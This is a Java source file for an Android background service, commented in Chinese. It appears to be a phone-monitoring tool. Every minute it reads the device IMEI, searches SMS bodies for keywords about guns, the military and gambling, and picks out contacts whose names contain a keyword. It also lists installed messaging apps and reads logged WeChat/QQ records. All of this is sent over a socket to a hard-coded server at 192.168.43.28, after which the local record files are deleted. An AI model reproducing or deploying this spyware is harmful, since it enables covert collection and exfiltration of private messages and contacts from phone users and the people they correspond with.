package com.example.txf.eye;

import android.Manifest;
import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Binder;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.text.LoginFilter;
import android.util.ArrayMap;
import android.util.JsonReader;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeSet;

public class MyService extends Service {
    private Uri SMS_INBOX = Uri.parse("content://sms/");

    private PhoneBinder mBinder = new PhoneBinder();

    String IMEI = "";

    public MyService() {
    }

    //主要功能的实现
    private void runBody(Intent intent){

        final List<String> perList = new ArrayList<>();

        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE ) ==
                PackageManager.PERMISSION_GRANTED ){
            perList.add("手机硬件信息权限");
        }
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS ) ==
                PackageManager.PERMISSION_GRANTED ) {
            perList.add("联系人权限");
        }
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS ) ==
                PackageManager.PERMISSION_GRANTED){
            perList.add("短信权限");
        }

        perList.add("网络连接权限");

        final String[] permission = perList.toArray(new String[perList.size()]);




        //  调试：输出权限信息
        for (String str : permission){
            Log.d("permisson",str);
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                Log.d("新线程","开启成功");

                //查询IMEI,设置IMEI的显示
                if(perList.contains("手机硬件信息权限")){
                    Context context = getApplicationContext();
                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Activity.TELEPHONY_SERVICE);
                    IMEI = tm.getDeviceId();
                    Log.d("IMEI",IMEI);
                }

                final JSONObject permissions = new JSONObject();
                int i_p = 0;
                try {
                    permissions.put("IMEI",IMEI);
                    for (String p : permission){
                        permissions.put(i_p + "",p);
                        i_p ++;
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }


                //查询短信敏感字
                JSONObject messages = new JSONObject();


                if(perList.contains("短信权限")){
                    String[] projection = {"address","person","body","date","type"};
                    String address,person,body,date,type;
                    Long dateLong;
                    Cursor cursorMessage = getContentResolver().query(SMS_INBOX,projection,null,null,null);

                    if(cursorMessage != null){
                        try {
                            int i_mes = 0;
                            messages.put("IMEI",IMEI);

                            while (cursorMessage.moveToNext()) {
                                address = cursorMessage.getString(cursorMessage.getColumnIndex("address"));
                                person = cursorMessage.getString(cursorMessage.getColumnIndex("person"));
                                body = cursorMessage.getString(cursorMessage.getColumnIndex("body"));
                                dateLong = cursorMessage.getLong(cursorMessage.getColumnIndex("date"));
                                type = cursorMessage.getString(cursorMessage.getColumnIndex("type"));

                                Date date1 = new Date(dateLong);
                                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                                date =dateFormat.format(date1);


                                if(body.contains("军") || body.contains("枪") || body.contains("赌")){
                                    JSONObject message = new JSONObject();
                                    message.put("number",address);

                                    Map messageMap = new HashMap();
                                    message.put("number",address);
                                    message.put("person",person);
                                    message.put("body",body);
                                    message.put("date",date);
                                    message.put("type",type);
                                    messages.put(i_mes + "",message);
                                    i_mes ++;
                                }
                            }
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                        cursorMessage.close();
                    }
                }

                //查询联系人敏感字
                JSONObject contacts = new JSONObject();
                String name = "";
                if(perList.contains("联系人权限")){
                    Cursor cursorContact = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,null,null,null);
                    if(cursorContact != null){
                        try {
                            int i_con = 0;
                            contacts.put("IMEI",IMEI);

                            while (cursorContact.moveToNext()){
                                name = cursorContact.getString(cursorContact.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

                                //如果联系人名中有敏感字，就把联系人的信息加入Map中
                                if (name.contains("长")){
                                    JSONObject contact = new JSONObject();
                                    contact.put(name,cursorContact.getString(cursorContact.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                                    contacts.put(i_con + "",contact);
                                    i_con ++;
                                }
                            }
                        }catch (Exception e){
                            e.printStackTrace();
                        }

                        cursorContact.close();
                    }
                }

                //查询所有开启的权限
                //权限 保存在perList中

                //查询不允许使用的应用
                JSONObject apps = new JSONObject();
                String[] appNames = {"抖音短视频","微信","QQ"};
                List<String> appList = Arrays.asList(appNames);
                Activity mainActivity = MainActivity.sInstance;
                PackageManager packageManager = mainActivity.getPackageManager();

                List<PackageInfo> packages = packageManager.getInstalledPackages(0);
                try {
                    int i_app = 0;
                    apps.put("IMEI",IMEI);

                    for(PackageInfo packageInfo : packages){
                        String packageName = packageInfo.applicationInfo.loadLabel(packageManager).toString();
                        if(appList.contains(packageName)){
                                apps.put(i_app + "",packageName);
                                i_app ++;
                        }
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }


                //查询GPS坐标

                //查询微信或者QQ的记录
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
                Date datetime = new Date();
                Calendar calendar = Calendar.getInstance();
                calendar.setTime(datetime);
                calendar.add(Calendar.MINUTE,-1);
                Date datetime1 = calendar.getTime();
                String date1 = dateFormat.format(datetime1);
                calendar.add(Calendar.MINUTE,-1);
                Date datetime2 = calendar.getTime();
                String date2 = dateFormat.format(datetime2);


                FileInputStream in = null;
                BufferedReader reader = null;

                JSONObject jilu,jilus;
                jilus = new JSONObject();
                int i = 0;
                String line = "";
                /***
                try {
                    in = openFileInput(date2);
                    Log.d("服务 读取 文件名",date2);
                    reader = new BufferedReader(new InputStreamReader(in));

                    while ((line = reader.readLine()) != null){
                        Log.d("服务 读取 内容1条",line);
                        jilu = new JSONObject();
                        jilu.put("IMEI",IMEI);
                        jilu.put("记录",line);
                        jilus.put(i + "",jilu);
                        i++;
                    }
                    in.close();
                }catch (IOException e){
                    e.printStackTrace();
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                ***/

                try {
                    in = openFileInput(date1);
                    Log.d("服务 读取 文件名",date1);
                    reader = new BufferedReader(new InputStreamReader(in));
                    while ((line = reader.readLine()) != null){
                        Log.d("服务 读取 内容1条",line);
                        jilu = new JSONObject();
                        jilu.put("IMEI",IMEI);
                        jilu.put("记录",line);
                        jilus.put(i + "",jilu);
                        i++;
                    }
                    in.close();
                }catch (IOException e){
                    e.printStackTrace();
                } catch (JSONException e) {
                    e.printStackTrace();
                }


                //Socket编程，向服务器传输信息

                //Log.d("服务 文件名data2",date2);
                Log.d("服务 文件名data1",date1);

                try{
                    Log.d("服务 文件读取",jilus.toString());
                    if(jilus.length() > 0)
                        socketSend("QW",jilus);

                    // 这个删除文件以后需要放在发送完信息以后
                    if(deleteFile(date2))
                        Log.d("服务 文件删除成功",date2);
                    if(deleteFile(date1))
                        Log.d("服务 文件删除成功",date1);

                }catch (Exception e){
                    e.printStackTrace();
                }


                Log.d("Socket 编程","准备开启");
                try {
                    String rec_data = socketSend("IMEI",IMEI);
                    String type;

                    while (rec_data != "all ok") {
                        switch (rec_data) {
                            case "IMEI ok":
                                type = "keyword_contact";
                                rec_data = socketSend(type, contacts);
                                break;
                            case "keyword_contact ok":
                                type = "keyword_message";
                                rec_data = socketSend(type,messages);
                                break;
                            case "keyword_message ok":
                                type = "permission";
                                rec_data = socketSend(type,permissions);
                                break;
                            case "permission ok":
                                type = "appName";
                                rec_data = socketSend(type,apps);
                                break;
                            case "appName ok":
                                type = "GPS";
                                rec_data = "GPS ok";
                                break;
                            default:
                                break;
                        }
                    }

                }catch (Exception e){
                    e.printStackTrace();
                }


                stopSelf();
            }
        }).start();

    }


    @Override
    public void onCreate() {
        super.onCreate();
        Log.d("输出","元素1");


    }


    private String socketSend(String type,Object data){
        try {
            Socket mysocket = new Socket("192.168.43.28",6543);
            OutputStream out = mysocket.getOutputStream();
            InputStream In = mysocket.getInputStream();

            String send_data,rec_data;

            out.write(type.getBytes());
            out.flush();
            Log.d("发送类型",type+" 发送成功");


            if(type != "keyword_message" && type != "QW"){
                send_data = data.toString();
                out.write(send_data.getBytes());
                out.flush();
                Log.d("发送数据",send_data +" 发送成功");
            }
            else{
                JSONObject dataj = (JSONObject)data;
                int length = dataj.length();

                JSONObject len = new JSONObject();
                len.put("length",length);
                out.write(len.toString().getBytes());
                out.flush();
                Thread.sleep(100);

                Iterator iterator = dataj.keys();
                boolean is_imeisend = false;
                while (iterator.hasNext()){
                    if(is_imeisend){
                        String key = iterator.next().toString();
                        send_data = dataj.getString(key);
                        Thread.sleep(100);
                        out.write(send_data.getBytes());
                        out.flush();
                    }
                    else {
                        String key = iterator.next().toString();
                        send_data = dataj.getString(key);

                        Thread.sleep(100);
                        JSONObject datatmp = new JSONObject();
                        datatmp.put("IMEI",send_data);
                        send_data = datatmp.toString();
                        out.write(send_data.getBytes());
                        out.flush();
                        is_imeisend = true;
                    }
                }
                Log.d("发送数据"," 发送成功");
            }



            BufferedReader br = new BufferedReader(new InputStreamReader(In));
            rec_data = br.readLine();

            Log.d("接收数据",rec_data);

            return rec_data;
        }catch (Exception e){
            e.printStackTrace();
        }
        return "defeated";
    }

    @Override
    public int onStartCommand(final Intent intent, int flags, int startId) {
        Log.d("输出","元素2");
        final Intent intent1 = intent;

        // 设置间隔时间为 60 秒
        final  int Interval_Time = 60 * 1000;


        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    runBody(intent1);
                    try {
                        Thread.sleep(Interval_Time);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }

            }
        }).start();


        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        stopSelf();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return mBinder;
    }

    private void getIMEI(){
        //使用静态变量把活动本身传递到服务
        Activity activity = MainActivity.sInstance;
        Context context = getApplicationContext();
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Activity.TELEPHONY_SERVICE);
        IMEI = tm.getDeviceId();

    }

    class PhoneBinder extends Binder{
        public String getIMEI(){
            return IMEI;
        }

    }

}
